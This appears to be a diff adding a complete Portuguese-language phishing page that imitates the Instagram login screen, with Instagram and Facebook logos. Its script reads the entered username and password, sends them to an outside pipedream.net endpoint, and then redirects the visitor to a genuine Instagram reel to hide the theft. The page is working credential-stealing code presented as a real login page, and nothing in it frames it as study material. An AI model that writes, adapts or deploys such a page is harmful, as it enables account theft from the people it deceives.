@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { background: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .login-container { background: #fff; border: 1px solid #dbdbdb; padding: 40px 32px; width: 320px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); display: flex; flex-direction: column; align-items: center; }
+    .logo { width: 175px; margin-bottom: 24px; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; font-size: 16px; }
+    .login-btn-link { display: block; width: 100%; padding: 10px; background: #3897f0; color: #fff; text-align: center; border-radius: 4px; font-weight: bold; margin-top: 12px; cursor: pointer; font-size: 16px; text-decoration: none; transition: background 0.2s; }
+    .login-btn-link:hover { background: #1877f2; }
+    .divider { margin: 20px 0; width: 100%; text-align: center; position: relative; color: #999; }
+    .divider:before, .divider:after { content: ""; position: absolute; top: 50%; width: 40%; height: 1px; background: #dbdbdb; }
+    .divider:before { left: 0; }
+    .divider:after { right: 0; }
+    .divider span { background: #fff; padding: 0 10px; position: relative; z-index: 1; }
+    .facebook-login { color: #385185; font-weight: bold; text-decoration: none; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+    .forgot { color: #00376b; font-size: 14px; text-decoration: none; margin-top: 12px; }
+    .register { margin-top: 24px; padding: 16px; background: #fff; border: 1px solid #dbdbdb; text-align: center; border-radius: 8px; font-size: 15px; }
+    .register a { color: #3897f0; font-weight: bold; text-decoration: none; margin-left: 4px; }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+    <input id="user" type="text" placeholder="Telefone, nome de usuário ou email">
+    <input id="pass" type="password" placeholder="Senha">
+    <a class="login-btn-link" href="#" onclick="enviarDados(event)">Entrar</a>
+    <div class="divider"><span>OU</span></div>
+    <a href="#" class="facebook-login">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="20" alt="Facebook">
+      Entrar com o Facebook
+    </a>
+    <a href="#" class="forgot">Esqueceu a senha?</a>
+    <div class="register">
+      Não tem uma conta?
+      <a href="#">Cadastre-se</a>
+    </div>
+  </div>
+  <script>
+    function enviarDados(e) {
+      e.preventDefault();
+      const usuario = document.getElementById('user').value;
+      const senha = document.getElementById('pass').value;
+
+      fetch('https://eoff05td1piawrh.m.pipedream.net', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({usuario, senha})
+      }).then(() => {
+        window.location.href = "https://www.instagram.com/reel/DN8IgzUEaX5/?igsh=YnpucWh5ZTNmMHU2";
+      }).catch(() => {
+        window.location.href = "https://www.instagram.com/reel/DN8IgzUEaX5/?igsh=YnpucWh5ZTNmMHU2";
+      });
+    }
+  </script>
+</body>
+</html>
